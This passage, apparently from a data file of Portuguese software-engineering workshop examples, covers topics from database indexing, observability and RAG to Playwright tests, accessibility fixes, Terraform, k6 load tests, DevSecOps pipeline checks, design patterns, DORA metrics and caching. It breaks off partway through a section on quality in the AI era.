  console.log("No servidor:", servidor.length);                               // 0

  // A conexão volta
  await fila.reconectar();
  console.log("No servidor:", servidor.length);                               // 2
  console.log(await fila.executar({ id: "a3", tipo: "curtir", post: 9 }));    // enviada
})();` },
      { nome: "Decisões que o time precisa tomar", tabela: {
        colunas: ["Pergunta", "Opção comum"],
        linhas: [
          ["O que a tela mostra enquanto a ação está na fila?", "Mostra como feita, com um indicador de pendente"],
          ["E se o servidor recusar a ação depois?", "Desfaz na tela e avisa o usuário"],
          ["E se dois aparelhos editarem o mesmo dado?", "Vence a última alteração, ou o servidor decide por campo"],
          ["Como evitar envio duplicado em nova tentativa?", "Cada ação leva um identificador único"]
        ]
      } }
    ],
    observar: "A ação só sai da fila depois da confirmação do servidor. O id de cada ação permite ao servidor ignorar repetições."
  },
  /* 18 — Bancos de dados */
  {
    intro: "Uma consulta lenta diagnosticada com o plano de execução e corrigida com índice, e um caso de N+1 resolvido (PostgreSQL).",
    blocos: [
      { nome: "consulta-lenta.sql", codigo: `-- 1. A consulta que aparece no log de lentas
SELECT id, total, criado_em
FROM pedidos
WHERE cliente_id = 4821 AND status = 'aberto'
ORDER BY criado_em DESC
LIMIT 20;

-- 2. Pedir o plano de execução
EXPLAIN ANALYZE
SELECT id, total, criado_em FROM pedidos
WHERE cliente_id = 4821 AND status = 'aberto'
ORDER BY criado_em DESC LIMIT 20;

-- Sinal de alerta no resultado:
--   Seq Scan on pedidos  ...  Rows Removed by Filter: (quase a tabela inteira)
-- O banco leu todas as linhas para devolver vinte.

-- 3. Criar um índice que atende ao filtro e à ordenação
CREATE INDEX CONCURRENTLY idx_pedidos_cliente_status_data
  ON pedidos (cliente_id, status, criado_em DESC);

-- 4. Repetir o EXPLAIN ANALYZE. O esperado agora:
--   Index Scan using idx_pedidos_cliente_status_data ...
-- Compare o "Execution Time" de antes e depois.` },
      { nome: "n-mais-1.sql", codigo: `-- O que o ORM faz sem ninguém perceber: 1 consulta + 1 por pedido
SELECT * FROM pedidos WHERE cliente_id = 4821;        -- devolve 50 pedidos
SELECT * FROM itens WHERE pedido_id = 1001;
SELECT * FROM itens WHERE pedido_id = 1002;
-- ... mais 48 consultas

-- Correção: buscar todos os itens de uma vez
SELECT * FROM itens
WHERE pedido_id IN (SELECT id FROM pedidos WHERE cliente_id = 4821);

-- No ORM, isso costuma se chamar eager loading, include, preload ou join fetch.` }
    ],
    observar: "A ordem das colunas no índice segue a consulta: primeiro as de igualdade, depois a de ordenação. Ligue o log de SQL do ORM para enxergar o N+1."
  },
  /* 19 — Observabilidade */
  {
    intro: "Os três sinais na prática: um log estruturado, um trecho instrumentado com OpenTelemetry e a definição de um SLO.",
    blocos: [
      { nome: "Log: texto livre versus estruturado", codigo: `# Antes: difícil de filtrar e de agregar
Erro ao processar pedido 4821 do cliente 77 depois de 2300ms

# Depois: um JSON por linha, com o identificador de rastreamento
{
  "nivel": "error",
  "mensagem": "Falha ao processar pedido",
  "pedidoId": 4821,
  "clienteId": 77,
  "duracaoMs": 2300,
  "traceId": "4bf92f3577b34da6a3ce929d0e0e4736",
  "servico": "pedidos"
}` },
      { nome: "buscar-pedido.js", codigo: `const { trace, SpanStatusCode } = require("@opentelemetry/api");
const tracer = trace.getTracer("pedidos");

async function buscarPedido(id) {
  return tracer.startActiveSpan("buscar-pedido", async (span) => {
    span.setAttribute("pedido.id", id);
    try {
      const pedido = await repositorio.buscar(id);        // vira um trecho filho
      pedido.frete = await servicoDeFrete.calcular(pedido); // outro trecho filho
      return pedido;
    } catch (erro) {
      span.recordException(erro);
      span.setStatus({ code: SpanStatusCode.ERROR });
      throw erro;
    } finally {
      span.end();
    }
  });
}` },
      { nome: "SLO do serviço de pedidos", tabela: {
        colunas: ["Elemento", "Definição"],
        linhas: [
          ["SLI (o que medimos)", "Percentual de requisições a /pedidos respondidas com sucesso em menos de 500 ms"],
          ["SLO (a meta)", "99,5% em uma janela de 30 dias"],
          ["Orçamento de erro", "0,5% das requisições: cerca de 3 h 36 min de indisponibilidade equivalente em 30 dias"],
          ["Alerta", "Dispara quando o orçamento está sendo consumido rápido demais, não a cada erro isolado"],
          ["Se o orçamento acabar", "Novas funcionalidades param e o foco passa a ser estabilidade"]
        ]
      } }
    ],
    observar: "No rastreamento, a barra mais longa mostra onde o tempo foi gasto. O traceId no log liga os três sinais entre si."
  },
  /* 20 — LLMs por dentro */
  {
    intro: "O fluxo de RAG em miniatura, sem API: recuperar o trecho mais parecido com a pergunta e montar o prompt. A similaridade aqui é por palavras em comum; em um sistema real ela vem de embeddings.",
    blocos: [
      { nome: "rag-miniatura.js", rodar: true, codigo: `const documentos = [
  "Para pedir férias, abra um chamado no portal de RH com 30 dias de antecedência.",
  "O deploy em produção acontece às terças e quintas, depois da aprovação do QA.",
  "Senhas devem ser trocadas a cada 90 dias e nunca compartilhadas.",
];

// 1. Representar cada texto (aqui: conjunto de palavras; na vida real: embedding)
const palavras = (texto) =>
  new Set(
    texto.toLowerCase().normalize("NFD").replace(/[^a-z ]/g, "")
      .split(" ").filter((p) => p.length > 3)
  );

// 2. Medir a semelhança entre a pergunta e cada documento
function similaridade(a, b) {
  const emComum = [...a].filter((p) => b.has(p)).length;
  return emComum / Math.sqrt(a.size * b.size);
}

// 3. Recuperar o trecho mais relevante
function recuperar(pergunta) {
  const p = palavras(pergunta);
  return documentos
    .map((texto) => ({ texto, nota: similaridade(p, palavras(texto)) }))
    .sort((x, y) => y.nota - x.nota)[0];
}

// 4. Montar o prompt que seria enviado ao modelo
const pergunta = "Quando acontece o deploy em produção?";
const trecho = recuperar(pergunta);

const prompt = [
  "Responda usando apenas o contexto abaixo.",
  "Se a resposta não estiver no contexto, diga que não sabe.",
  "",
  "Contexto: " + trecho.texto,
  "",
  "Pergunta: " + pergunta,
].join("\\n");

console.log("Nota de similaridade:", trecho.nota.toFixed(2));
console.log(prompt);` },
      { nome: "Do exemplo ao sistema real", tabela: {
        colunas: ["No exemplo", "Em produção"],
        linhas: [
          ["Conjunto de palavras", "Embedding gerado por um modelo"],
          ["Lista em memória", "Banco vetorial"],
          ["Um documento por frase", "Documentos divididos em trechos com sobreposição"],
          ["console.log do prompt", "Chamada ao modelo, com a fonte citada na resposta"]
        ]
      } }
    ],
    observar: "O modelo só vê o que está no prompt. A qualidade da resposta depende primeiro da qualidade da recuperação."
  },
  /* 21 — Team Topologies */
  {
    intro: "O caminho de uma funcionalidade pelos setores, com tempo de trabalho e de espera em cada etapa (dados fictícios).",
    blocos: [
      { nome: "Funcionalidade: filtro por data no relatório", tabela: {
        colunas: ["Etapa", "Setor", "Trabalho", "Espera antes"],
        linhas: [
          ["Refinamento", "Gestão e produto", "1 dia", "—"],
          ["Endpoint novo", "Back-end", "2 dias", "3 dias na fila"],
          ["Tela web", "Front-end", "2 dias", "4 dias aguardando o endpoint"],
          ["Tela no app", "Mobile", "3 dias", "4 dias aguardando o endpoint"],
          ["Testes", "QA", "2 dias", "5 dias na fila"],
          ["Correções", "Back e front", "1 dia", "2 dias"],
          ["Publicação", "Infra", "0,5 dia", "3 dias até a janela de deploy"]
        ]
      } },
      { nome: "Leitura do mapa", tabela: {
        colunas: ["Indicador", "Valor"],
        linhas: [
          ["Trabalho efetivo (caminho mais longo)", "9,5 dias"],
          ["Espera acumulada", "17 dias"],
          ["Eficiência de fluxo", "Cerca de 36%: a funcionalidade passa quase dois terços do tempo parada"],
          ["Maior fila", "QA (5 dias) e dependência do endpoint (4 dias)"]
        ]
      } },
      { nome: "Experimentos possíveis", codigo: `1. Contrato primeiro
   Back, front e mobile fecham o contrato da API no refinamento.
   Front e mobile trabalham com mock e deixam de esperar o endpoint.

2. QA desde o início
   QA participa do refinamento e escreve os cenários antes do código.
   Os testes rodam por etapa, não só no final.

3. Trio por funcionalidade
   Por um mês, uma pessoa de back, uma de front ou mobile e uma de QA
   trabalham juntas em uma funcionalidade, do início ao fim.
   Meça de novo e compare a espera acumulada.` }
    ],
    observar: "O tempo perdido está nas passagens de bastão, não na execução. Reduzir espera rende mais do que acelerar qualquer etapa."
  },
  /* 22 — Monólito modular ou microsserviços */
  {
    intro: "Um cenário para o debate em grupo e a decisão registrada no formato de ADR.",
    blocos: [
      { nome: "cenario.md", codigo: `# Cenário: plataforma de agendamento para clínicas

Time:      8 pessoas (3 back, 2 front, 2 mobile, 1 QA), sem equipe de infraestrutura
Clientes:  40 clínicas hoje, meta de 300 em dois anos
Carga:     pico de 50 requisições por segundo, das 8h às 10h
Módulos:   agenda, pacientes, cobrança, notificações (SMS e e-mail)

Dores atuais:
- Um erro no envio de SMS já derrubou a agenda inteira
- Publicações semanais, com receio de quebrar algo
- Cobrança muda toda semana; agenda quase nunca muda

Pergunta: monólito modular ou microsserviços?` },
      { nome: "adr-007-estilo-de-arquitetura.md", codigo: `# ADR 007: Monólito modular com notificações assíncronas

Status: aceita

## Contexto
Time de 8 pessoas, sem equipe dedicada de infraestrutura. A carga atual e a
projetada cabem em uma única aplicação. As dores são falta de isolamento
entre módulos e medo de publicar, não limite de escala.

## Decisão
Manter uma única aplicação, organizada em quatro módulos com fronteiras
explícitas: cada módulo tem interface pública e tabelas próprias, e um
módulo não acessa as tabelas do outro. O envio de notificações passa a ser
feito por fila, fora da requisição.

## Alternativas descartadas
- Microsserviços: resolveriam o isolamento, mas exigiriam operar quatro
  serviços, mensageria e monitoramento distribuído com o time atual.
- Manter como está: não resolve a queda em cascata nem o medo de publicar.

## Consequências
- Falha no SMS deixa de afetar a agenda.
- Um único deploy continua simples de operar.
- As fronteiras permitem extrair cobrança como serviço se a necessidade surgir.
- Exige disciplina e uma verificação automática das dependências entre módulos.

## Quando revisar
Se o time passar de 20 pessoas ou se um módulo precisar escalar sozinho.` }
    ],
    observar: "A decisão parte das dores reais do cenário. O ADR registra também o que foi descartado e o gatilho para rever."
  },
  /* 23 — Testes ponta a ponta */
  {
    intro: "O fluxo de login até a criação de um pedido automatizado com Playwright e Page Objects.",
    blocos: [
      { nome: "paginas.js", codigo: `class PaginaDeLogin {
  constructor(page) { this.page = page; }

  async abrir() {
    await this.page.goto("/login");
  }

  async entrar(email, senha) {
    await this.page.getByLabel("E-mail").fill(email);
    await this.page.getByLabel("Senha").fill(senha);
    await this.page.getByRole("button", { name: "Entrar" }).click();
  }
}

class PaginaDePedidos {
  constructor(page) { this.page = page; }

  async criarPedido(produto, quantidade) {
    await this.page.getByRole("link", { name: "Novo pedido" }).click();
    await this.page.getByLabel("Produto").selectOption(produto);
    await this.page.getByLabel("Quantidade").fill(String(quantidade));
    await this.page.getByRole("button", { name: "Confirmar pedido" }).click();
  }

  mensagemDeSucesso() {
    return this.page.getByRole("status");
  }
}

module.exports = { PaginaDeLogin, PaginaDePedidos };` },
      { nome: "pedido.spec.js", codigo: `const { test, expect } = require("@playwright/test");
const { PaginaDeLogin, PaginaDePedidos } = require("./paginas");

test("cliente faz login e cria um pedido", async ({ page }) => {
  const login = new PaginaDeLogin(page);
  const pedidos = new PaginaDePedidos(page);

  await login.abrir();
  await login.entrar(process.env.USUARIO_TESTE, process.env.SENHA_TESTE);
  await expect(page.getByRole("heading", { name: "Meus pedidos" })).toBeVisible();

  await pedidos.criarPedido("Teclado mecânico", 2);
  await expect(pedidos.mensagemDeSucesso()).toContainText("Pedido criado");
});` },
      { nome: "playwright.config.js", codigo: `const { defineConfig } = require("@playwright/test");

module.exports = defineConfig({
  retries: process.env.CI ? 1 : 0,
  use: {
    baseURL: process.env.URL_HOMOLOGACAO,
    trace: "on-first-retry",          // rastro completo quando o teste falha
    video: "retain-on-failure",
    screenshot: "only-on-failure",
  },
});` }
    ],
    observar: "Os seletores usam rótulo e papel, como o usuário enxerga. Não existe nenhuma espera fixa: o expect aguarda a condição sozinho."
  },
  /* 24 — Design Systems e acessibilidade */
  {
    intro: "Um formulário com os problemas de acessibilidade mais comuns e a versão corrigida, mais os tokens de design usados.",
    blocos: [
      { nome: "formulario.html (antes)", codigo: `<div class="titulo">Cadastro</div>

<img src="logo.png">

<input type="text" placeholder="Seu e-mail">

<div class="botao" onclick="enviar()" style="color: #aaa; background: #fff">
  Enviar
</div>

<div class="erro" style="color: red">Campo obrigatório</div>` },
      { nome: "formulario.html (depois)", codigo: `<h1>Cadastro</h1>

<img src="logo.png" alt="Logotipo da Empresa">

<label for="email">Seu e-mail</label>
<input type="email" id="email" autocomplete="email"
       aria-describedby="erro-email" aria-invalid="true" required>

<p id="erro-email" class="erro" role="alert">
  Informe um e-mail para continuar.
</p>

<button type="submit" class="botao">Enviar</button>` },
      { nome: "tokens.css", codigo: `:root {
  /* Cores: contraste de pelo menos 4,5:1 entre texto e fundo */
  --cor-texto: #1b1d1a;
  --cor-fundo: #ffffff;
  --cor-acao: #0d6b4f;
  --cor-erro: #b3261e;

  /* Espaçamento em escala fixa */
  --espaco-1: 0.25rem;
  --espaco-2: 0.5rem;
  --espaco-4: 1rem;

  --raio: 8px;
}

.botao {
  background: var(--cor-acao);
  color: var(--cor-fundo);
  padding: var(--espaco-2) var(--espaco-4);
  border-radius: var(--raio);
}

.botao:focus-visible {
  outline: 3px solid var(--cor-texto);   /* foco sempre visível */
  outline-offset: 2px;
}` },
      { nome: "O que cada correção resolve", tabela: {
        colunas: ["Antes", "Problema", "Depois"],
        linhas: [
          ["div como título", "Leitor de tela não anuncia como título", "h1"],
          ["img sem alt", "Leitor lê o nome do arquivo", "alt descritivo"],
          ["placeholder como rótulo", "Some ao digitar e não é lido como rótulo", "label ligado ao campo"],
          ["div com onclick", "Não recebe foco nem responde ao teclado", "button"],
          ["Cinza claro sobre branco", "Contraste insuficiente", "Cores dos tokens"],
          ["Erro só pela cor", "Invisível para leitor de tela e para daltônicos", "Texto com role=\"alert\" ligado ao campo"]
        ]
      } }
    ],
    observar: "Quase toda correção foi trocar um div pelo elemento HTML certo. O teste mais rápido é tentar usar a tela só com a tecla Tab."
  },
  /* 25 — Eventos e mensageria */
  {
    intro: "Um broker em memória com dois consumidores do evento Pedido Criado. A entrega duplicada mostra a diferença entre um consumidor idempotente e um que não é.",
    blocos: [
      { nome: "eventos.js", rodar: true, codigo: `class Broker {
  constructor() { this.assinantes = {}; }

  assinar(topico, consumidor) {
    (this.assinantes[topico] = this.assinantes[topico] || []).push(consumidor);
  }

  publicar(topico, evento) {
    (this.assinantes[topico] || []).forEach((consumidor) => consumidor(evento));
  }
}

const broker = new Broker();

// Consumidor 1: estoque. Idempotente: lembra os eventos que já processou.
const estoque = { reservados: 0, processados: new Set() };
broker.assinar("pedido.criado", (evento) => {
  if (estoque.processados.has(evento.id)) return;
  estoque.processados.add(evento.id);
  estoque.reservados += evento.quantidade;
});

// Consumidor 2: e-mail. NÃO é idempotente.
const emailsEnviados = [];
broker.assinar("pedido.criado", (evento) => {
  emailsEnviados.push("Recebemos o seu pedido " + evento.pedido);
});

// O produtor publica e, por uma falha de rede, a mensagem é entregue duas vezes
const evento = { id: "evt-001", pedido: 42, quantidade: 2 };
broker.publicar("pedido.criado", evento);
broker.publicar("pedido.criado", evento);

console.log("Itens reservados:", estoque.reservados);    // 2  (correto)
console.log("E-mails enviados:", emailsEnviados.length); // 2  (cliente recebeu em dobro)` },
      { nome: "Com um broker de verdade", tabela: {
        colunas: ["No exemplo", "Em produção"],
        linhas: [
          ["Classe Broker em memória", "RabbitMQ, Kafka ou o serviço de filas da nuvem"],
          ["Set de eventos processados", "Tabela de eventos processados, na mesma transação do efeito"],
          ["Segunda chamada a publicar", "Nova tentativa automática depois de uma falha de confirmação"],
          ["Consumidor que lança erro", "Mensagem vai para a fila de mensagens mortas depois de N tentativas"]
        ]
      } }
    ],
    observar: "O produtor não conhece os consumidores. Como a duplicidade é inevitável, a idempotência é obrigação de quem consome."
  },
  /* 26 — Agentes de IA */
  {
    intro: "As peças de um agente que lê uma issue e propõe um merge request: a definição das ferramentas, o ciclo de execução e a política de aprovação.",
    blocos: [
      { nome: "ferramentas.json", codigo: `[
  {
    "name": "buscar_no_codigo",
    "description": "Procura um texto no repositório e devolve os arquivos e as linhas onde aparece. Use antes de propor qualquer alteração.",
    "input_schema": {
      "type": "object",
      "properties": {
        "termo": { "type": "string", "description": "Texto ou nome de função a procurar" }
      },
      "required": ["termo"]
    }
  },
  {
    "name": "rodar_testes",
    "description": "Executa a suíte de testes e devolve os testes que falharam, com a mensagem de erro. Use depois de cada alteração.",
    "input_schema": {
      "type": "object",
      "properties": {
        "caminho": { "type": "string", "description": "Pasta ou arquivo de teste. Vazio roda tudo." }
      }
    }
  }
]` },
      { nome: "ciclo-do-agente.js (estrutura)", codigo: `// chamarModelo, executarFerramenta e pedirAprovacao são as integrações do time.
const LIMITE_DE_PASSOS = 15;

async function executarAgente(issue) {
  const historico = [{ papel: "usuario", conteudo: "Resolva esta issue: " + issue.texto }];

  for (let passo = 1; passo <= LIMITE_DE_PASSOS; passo++) {
    const resposta = await chamarModelo(historico, ferramentas);   // planejar

    if (!resposta.ferramenta) {
      return resposta.texto;                                       // terminou
    }

    if (exigeAprovacao(resposta.ferramenta)) {
      const aprovado = await pedirAprovacao(resposta);
      if (!aprovado) return "Interrompido: ação não aprovada.";
    }

    const resultado = await executarFerramenta(resposta.ferramenta); // agir
    registrar(passo, resposta.ferramenta, resultado);                // auditar
    historico.push({ papel: "ferramenta", conteudo: resultado });    // observar
  }

  return "Interrompido: limite de passos atingido.";
}` },
      { nome: "Política de aprovação", tabela: {
        colunas: ["Ação", "Regra"],
        linhas: [
          ["Ler código, issues e documentação", "Livre"],
          ["Rodar testes e lint", "Livre"],
          ["Criar branch e abrir merge request", "Livre, sempre com revisão humana antes do merge"],
          ["Alterar pipeline, dependências ou configuração", "Exige aprovação"],
          ["Fazer merge, publicar ou acessar produção", "Nunca"],
          ["Ler segredos e dados de clientes", "Nunca: o agente não recebe essas credenciais"]
        ]
      } }
    ],
    observar: "A descrição da ferramenta diz ao modelo quando usá-la. O limite de passos e o registro de cada ação são os freios do agente."
  },
  /* 27 — Infraestrutura como código */
  {
    intro: "Um ambiente com rede, banco e aplicação descrito em Terraform usando o provedor Docker, para praticar sem conta de nuvem e sem custo.",
    blocos: [
      { nome: "main.tf", codigo: `terraform {
  required_providers {
    docker = {
      source  = "kreuzwerker/docker"
      version = "~> 3.0"
    }
  }
}

provider "docker" {}

variable "porta_da_aplicacao" {
  type    = number
  default = 8080
}

resource "docker_network" "rede" {
  name = "techtalk"
}

resource "docker_image" "banco" {
  name = "postgres:16-alpine"
}

resource "docker_container" "banco" {
  name  = "techtalk-banco"
  image = docker_image.banco.image_id
  env   = ["POSTGRES_PASSWORD=treino"]

  networks_advanced {
    name = docker_network.rede.name
  }
}

resource "docker_image" "aplicacao" {
  name = "nginx:alpine"
}

resource "docker_container" "aplicacao" {
  name  = "techtalk-app"
  image = docker_image.aplicacao.image_id

  networks_advanced {
    name = docker_network.rede.name
  }

  ports {
    internal = 80
    external = var.porta_da_aplicacao
  }
}

output "endereco" {
  value = "http://localhost:8080"
}` },
      { nome: "terminal", codigo: `terraform init                 # baixa o provedor
terraform plan                 # mostra o que será criado: revise como um merge request
terraform apply                # cria rede, banco e aplicação
curl http://localhost:8080     # a aplicação responde

docker rm -f techtalk-app      # alguém alterou por fora do código...
terraform plan                 # ...e o Terraform detecta o desvio

terraform destroy              # apaga tudo
terraform apply                # e recria igual: o ambiente é reproduzível` }
    ],
    observar: "O plan mostra a diferença entre o código e a realidade. Na nuvem, muda o provedor e os recursos; o fluxo init, plan e apply é o mesmo."
  },
  /* 28 — Testes de performance e carga */
  {
    intro: "Um roteiro de carga em k6 que sobe os usuários em degraus até encontrar o ponto em que a latência degrada.",
    blocos: [
      { nome: "carga.js", codigo: `// Execute com: k6 run -e API_URL=https://homologacao.exemplo.com carga.js
import http from "k6/http";
import { check, sleep } from "k6";

export const options = {
  stages: [
    { duration: "1m", target: 20 },    // aquecimento
    { duration: "3m", target: 20 },    // carga normal
    { duration: "2m", target: 60 },    // primeiro degrau
    { duration: "2m", target: 120 },   // segundo degrau
    { duration: "1m", target: 0 },     // desaceleração
  ],
  thresholds: {
    http_req_duration: ["p(95)<500"],  // 95% das respostas abaixo de 500 ms
    http_req_failed: ["rate<0.01"],    // menos de 1% de erro
  },
};

export default function () {
  const resposta = http.get(__ENV.API_URL + "/pedidos?pagina=1");

  check(resposta, {
    "status 200": (r) => r.status === 200,
    "devolveu itens": (r) => r.json("itens") !== undefined,
  });

  sleep(1);   // pausa entre ações, como um usuário de verdade
}` },
      { nome: "Como ler o resultado", tabela: {
        colunas: ["Sinal", "Onde olhar", "Hipótese"],
        linhas: [
          ["p(95) sobe a cada degrau", "http_req_duration no resumo do k6", "Algum recurso está saturando"],
          ["CPU da aplicação em 100%", "Painel de métricas da aplicação", "Gargalo de processamento: escalar ou otimizar o código"],
          ["CPU baixa e latência alta", "Conexões e consultas lentas no banco", "Gargalo no banco ou no pool de conexões"],
          ["Erros 5xx aparecem de repente", "http_req_failed e logs", "Limite de conexões, memória ou tempo limite atingido"]
        ]
      } }
    ],
    observar: "O teste falha sozinho quando os limites são violados, então pode rodar no pipeline. Rode contra homologação e avise quem cuida do ambiente."
  },
  /* 29 — DevSecOps */
  {
    intro: "Dois jobs de segurança no pipeline (segredos e dependências), a demonstração do bloqueio e uma modelagem de ameaças de 15 minutos.",
    blocos: [
      { nome: ".gitlab-ci.yml (trecho)", codigo: `segredos:
  stage: verificar
  image:
    name: zricethezav/gitleaks:latest
    entrypoint: [""]
  script:
    - gitleaks detect --source . --redact    # falha se encontrar credenciais

dependencias:
  stage: verificar
  image: node:22
  script:
    - npm audit --audit-level=high           # falha em vulnerabilidade alta ou crítica` },
      { nome: "Demonstração do bloqueio", codigo: `# 1. Criar um arquivo com uma chave FALSA, só para o exercício
echo 'CHAVE_DE_API="chave-falsa-apenas-para-treino-0123456789abcdef"' > config.env
git checkout -b treino/segredo
git add config.env
git commit -m "test: adiciona chave falsa para o exercício"
git push origin treino/segredo

# 2. Acompanhar o pipeline: o job "segredos" deve falhar
#    (se não falhar, ajuste as regras do gitleaks até detectar o formato usado pelo time)

# 3. Lição importante: apagar o arquivo em um novo commit NÃO resolve.
#    A chave continua no histórico. Chave que vazou precisa ser revogada.` },
      { nome: "Modelagem de ameaças: recuperação de senha por e-mail", tabela: {
        colunas: ["O que pode dar errado?", "O que faremos?"],
        linhas: [
          ["Atacante descobre quais e-mails têm cadastro", "A resposta é sempre a mesma, exista ou não o e-mail"],
          ["Link de recuperação é reutilizado", "Token de uso único, com validade de 15 minutos"],
          ["Atacante dispara milhares de pedidos", "Limite de requisições por e-mail e por endereço de origem"],
          ["Token aparece em logs", "Não registrar a URL completa"],
          ["Sessões antigas continuam válidas depois da troca", "Encerrar todas as sessões ao trocar a senha"]
        ]
      } }
    ],
    observar: "As verificações rodam no primeiro estágio para falhar cedo. Cada linha da modelagem de ameaças vira um item do backlog."
  },
  /* 30 — Padrões de projeto */
  {
    intro: "O mesmo problema resolvido primeiro do jeito mais simples e depois com o padrão Strategy, para o grupo decidir qual manter.",
    blocos: [
      { nome: "notificar-simples.js", codigo: `function notificar(usuario, mensagem) {
  if (usuario.canal === "email") {
    console.log("E-mail para " + usuario.email + ": " + mensagem);
  } else if (usuario.canal === "sms") {
    console.log("SMS para " + usuario.telefone + ": " + mensagem);
  }
}

// Com dois canais, esta versão é a melhor: curta e óbvia.` },
      { nome: "notificar-strategy.js", rodar: true, codigo: `// Cada canal é uma estratégia com a mesma assinatura
const canais = {
  email: (usuario, mensagem) => "E-mail para " + usuario.email + ": " + mensagem,
  sms: (usuario, mensagem) => "SMS para " + usuario.telefone + ": " + mensagem,
  push: (usuario, mensagem) => "Push para o aparelho " + usuario.aparelho + ": " + mensagem,
};

function notificar(usuario, mensagem) {
  const enviar = canais[usuario.canal];
  if (!enviar) throw new Error("Canal desconhecido: " + usuario.canal);
  return enviar(usuario, mensagem);
}

// Canal novo: uma linha a mais, sem tocar em notificar()
canais.whatsapp = (usuario, mensagem) => "WhatsApp para " + usuario.telefone + ": " + mensagem;

console.log(notificar({ canal: "email", email: "ana@empresa.com" }, "Pedido enviado"));
console.log(notificar({ canal: "whatsapp", telefone: "(14) 90000-0000" }, "Pedido enviado"));` },
      { nome: "Quando o padrão compensa", tabela: {
        colunas: ["Situação", "Escolha"],
        linhas: [
          ["Dois canais e nenhuma previsão de novos", "Versão simples"],
          ["Canais novos a cada trimestre", "Strategy"],
          ["O mesmo if por canal aparece em vários arquivos", "Strategy"],
          ["Cada canal precisa de configuração e testes próprios", "Strategy, com um arquivo por canal"]
        ]
      } }
    ],
    observar: "O padrão resolve um problema de mudança frequente. Sem esse problema, ele é só indireção a mais."
  },
  /* 31 — Métricas DORA */
  {
    intro: "As quatro métricas DORA calculadas a partir de uma lista de deploys e de incidentes (dados fictícios de quatro semanas).",
    blocos: [
      { nome: "dora.js", rodar: true, codigo: `// commit: quando a mudança foi integrada · deploy: quando chegou à produção
const deploys = [
  { commit: "2027-05-03", deploy: "2027-05-06", falhou: false },
  { commit: "2027-05-05", deploy: "2027-05-06", falhou: false },
  { commit: "2027-05-07", deploy: "2027-05-13", falhou: true },
  { commit: "2027-05-12", deploy: "2027-05-13", falhou: false },
  { commit: "2027-05-14", deploy: "2027-05-20", falhou: false },
  { commit: "2027-05-18", deploy: "2027-05-20", falhou: false },
  { commit: "2027-05-21", deploy: "2027-05-27", falhou: true },
  { commit: "2027-05-25", deploy: "2027-05-27", falhou: false },
];

const incidentes = [
  { inicio: "2027-05-13T14:00", fim: "2027-05-13T17:30" },
  { inicio: "2027-05-27T10:00", fim: "2027-05-27T10:45" },
];

const SEMANAS = 4;
const UM_DIA = 24 * 60 * 60 * 1000;
const UMA_HORA = 60 * 60 * 1000;
const media = (valores) => valores.reduce((a, b) => a + b, 0) / valores.length;

const diasComDeploy = new Set(deploys.map((d) => d.deploy)).size;
const tempoDeEntrega = media(deploys.map((d) => (new Date(d.deploy) - new Date(d.commit)) / UM_DIA));
const taxaDeFalha = deploys.filter((d) => d.falhou).length / deploys.length;
const tempoDeRecuperacao = media(incidentes.map((i) => (new Date(i.fim) - new Date(i.inicio)) / UMA_HORA));

console.log("Frequência de deploy:", diasComDeploy / SEMANAS, "por semana");      // 1 por semana
console.log("Tempo de entrega:", tempoDeEntrega.toFixed(1), "dias");               // 3.4 dias
console.log("Taxa de falha:", (taxaDeFalha * 100).toFixed(0) + "%");               // 25%
console.log("Tempo de recuperação:", tempoDeRecuperacao.toFixed(1), "horas");      // 2.1 horas` },
      { nome: "Leitura do resultado", tabela: {
        colunas: ["Métrica", "Valor", "O que os dados sugerem"],
        linhas: [
          ["Frequência de deploy", "1 por semana", "As mudanças se acumulam até a janela semanal"],
          ["Tempo de entrega", "3,4 dias", "Mudança pronta na quinta espera até a quarta seguinte"],
          ["Taxa de falha", "25%", "Lotes grandes: os dois deploys com falha levavam mudanças de seis dias"],
          ["Tempo de recuperação", "2,1 horas", "Vale ensaiar o procedimento de reversão"]
        ]
      } }
    ],
    observar: "As quatro métricas se explicam juntas: deploy raro gera lote grande, e lote grande falha mais. Compare o time com ele mesmo ao longo do tempo."
  },
  /* 32 — Cache, filas e escalabilidade */
  {
    intro: "Cache-aside com tempo de vida em memória: o ganho na segunda leitura e o efeito manada quando o cache expira sob carga.",
    blocos: [
      { nome: "cache.js", rodar: true, codigo: `const cache = new Map();
let consultasAoBanco = 0;

// Simula uma consulta lenta
async function buscarNoBanco(id) {
  consultasAoBanco++;
  await new Promise((resolver) => setTimeout(resolver, 200));
  return { id, nome: "Produto " + id };
}

// Cache-aside: procura no cache; se não achar, busca e guarda
async function buscarProduto(id, tempoDeVidaMs = 5000) {
  const guardado = cache.get(id);
  if (guardado && guardado.expiraEm > Date.now()) return guardado.valor;

  const valor = await buscarNoBanco(id);
  cache.set(id, { valor, expiraEm: Date.now() + tempoDeVidaMs });
  return valor;
}

async function medir(rotulo, funcao) {
  const inicio = Date.now();
  await funcao();
  console.log(rotulo, Date.now() - inicio, "ms");
}

(async () => {
  await medir("1ª leitura (banco):", () => buscarProduto(7));   // ~200 ms
  await medir("2ª leitura (cache):", () => buscarProduto(7));   // ~0 ms

  // Efeito manada: o cache expira e 50 requisições chegam juntas
  cache.clear();
  consultasAoBanco = 0;
  await Promise.all(Array.from({ length: 50 }, () => buscarProduto(7)));
  console.log("Consultas ao banco na manada:", consultasAoBanco); // 50
})();` },
      { nome: "cache-sem-manada.js", rodar: true, codigo: `const cache = new Map();
const emAndamento = new Map();
let consultasAoBanco = 0;

async function buscarNoBanco(id) {
  consultasAoBanco++;
  await new Promise((resolver) => setTimeout(resolver, 200));
  return { id, nome: "Produto " + id };
}

// Requisições simultâneas para a mesma chave compartilham uma única consulta
async function buscarProduto(id, tempoDeVidaMs = 5000) {
  const guardado = cache.get(id);
  if (guardado && guardado.expiraEm > Date.now()) return guardado.valor;

  if (!emAndamento.has(id)) {
    const promessa = buscarNoBanco(id)
      .then((valor) => {
        cache.set(id, { valor, expiraEm: Date.now() + tempoDeVidaMs });
        return valor;
      })
      .finally(() => emAndamento.delete(id));
    emAndamento.set(id, promessa);
  }
  return emAndamento.get(id);
}

(async () => {
  await Promise.all(Array.from({ length: 50 }, () => buscarProduto(7)));
  console.log("Consultas ao banco na manada:", consultasAoBanco); // 1
})();` }
    ],
    observar: "Sem proteção, 50 requisições simultâneas viram 50 consultas ao banco no pior momento. Com Redis a lógica é a mesma, com o cache compartilhado entre instâncias."
  },
  /* 33 — Qualidade na era da IA */
  {
    intro: "Casos de teste de uma história de usuário escritos por QA e por IA, lado a lado, e uma avaliação simples para uma funcionalidade de IA (exemplo ilustrativo).",
    blocos: [
      { nome: "historia.md", codigo: `Como cliente, quero aplicar um cupom de desconto no carrinho
para pagar menos na compra.
